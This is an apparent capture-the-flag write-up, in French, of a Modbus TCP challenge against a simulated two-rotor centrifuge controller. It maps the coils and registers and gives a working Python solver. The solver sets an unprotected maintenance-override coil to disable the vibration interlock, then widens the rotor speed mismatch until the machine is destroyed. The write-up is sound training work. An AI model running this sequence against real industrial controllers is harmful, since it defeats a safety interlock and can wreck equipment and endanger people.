# OT-007 — Centrifuge Resonance (real Modbus TCP)

## Cible
- Page : https://otctf.pages.dev/ot-007-centrifuge-resonance/light
- Service : `<HOST>:<PORT>`
- Catégorie : OT
- Protocole : Modbus TCP réel (pas de variante custom)
- Objectif : contrôleur de cascade de centrifugeuses, deux rotors, avec un interlock de
  vibration censé forcer un arrêt contrôlé avant que la vibration n'atteigne un niveau
  destructeur. Format `CTF{...}`.

## Modèle Modbus observé

- Coil 0 : POWER / run enable
- Coil 1 : **MAINTENANCE OVERRIDE** → désactive l'interlock de vibration
- Holding register 10 : setpoint vitesse rotor A (lourd/lent)
- Holding register 11 : setpoint vitesse rotor B (léger/rapide)
- Input registers (lecture d'état, 1 mot = 1 valeur) :
  - IR0 : status bitfield (bit1 = interlock déclenché, bit2 = DESTROYED)
  - IR2 : setpoint A courant
  - IR3 : setpoint B courant
  - IR4 : niveau de vibration
  - Le flag est écrit en ASCII dans les input registers (1 caractère par registre) une
    fois le statut DESTROYED atteint — il suffit de filtrer les valeurs imprimables et
    chercher `CTF{...}` dans la chaîne reconstituée.

## Faille

L'interlock de vibration est censé arrêter le système avant destruction, mais un coil
de **maintenance override** (coil 1) accessible sans restriction désactive complètement
cette protection. Une fois l'override activé :

1. **POWER ON** (coil 0 = True)
2. **MAINTENANCE OVERRIDE ON** (coil 1 = True) → l'interlock ne peut plus déclencher
   l'arrêt protecteur
3. Créer un **mismatch de vitesse** croissant entre les deux rotors (HR10 bas et fixe,
   HR11 monté progressivement : 3000 → 4000 → 4500 → 6000 → 9000...) → la vibration
   (IR4) augmente avec l'écart de vitesse entre les rotors
4. Sans interlock actif pour stopper le processus, la vibration dépasse le seuil
   destructeur → status bit2 (DESTROYED) se lève → le flag apparaît dans les input
   registers

Toute l'opération doit se faire dans **une seule connexion TCP** (le reset d'état /
remise à zéro des registres suggère que l'état n'est pas forcément persistant entre
connexions, ou en tout cas que la séquence doit s'enchaîner sans interruption pour
atteindre la vibration destructrice avant qu'un mécanisme de sécurité externe ne
réinitialise le process).

## Script (solver one-shot)

Client Modbus TCP minimal fait main (pas de dépendance `pymodbus`), implémentant les
function codes 0x01 (read coils), 0x03 (read holding registers), 0x04 (read input
registers), 0x05 (write single coil), 0x06 (write single register) par-dessus le
MBAP header standard.

```python
import time
from mb import MB

def main():
    m = MB(gap=0.03).connect()
    if m.hr(0,2)[0] == 'dead':
        print("server throttled/down - wait ~5 min of silence and retry"); return
    for i in range(90): m.write_reg(i, 0)          # clean slate
    m.write_coil(0, True)                          # POWER / run enable
    m.write_coil(1, True)                          # MAINTENANCE OVERRIDE -> interlock disabled
    m.write_reg(10, 1500)                          # Rotor A (heavy/slow) setpoint - keep low
    m.write_reg(11, 1500)                          # Rotor B (light/fast) setpoint
    time.sleep(1.5)
    for sp in [3000, 4000, 4500, 6000, 9000, 12000]:
        m.write_reg(11, sp)                        # widen the mismatch -> vibration rises
        for _ in range(2):
            time.sleep(0.8)
            ir = m.ir(0, 90)[1]
            if ir is None: break
            status, vib = ir[0], ir[4]
            if status & 4:                         # bit2 = DESTROYED
                chars = ''.join(chr(v) for v in ir if 32 <= v < 127)
                i = chars.find('CTF{')
                print("FLAG:", chars[i:chars.find('}', i)+1])
                m.close(); return
            if status & 2:                         # bit1 = interlock tripped (shouldn't happen w/ override)
                print("interlock tripped - override not engaged"); m.close(); return
    m.close()

if __name__ == '__main__':
    main()
```

## Résultat

Destruction atteinte dès le palier `HR11=9000` (vibration ≈ 300, status bit2 levé).
Flag récupéré en lisant les input registers après destruction.

Flag (caviardé) : `CTF{REDACTED}` — récupéré, à soumettre par l'utilisateur.
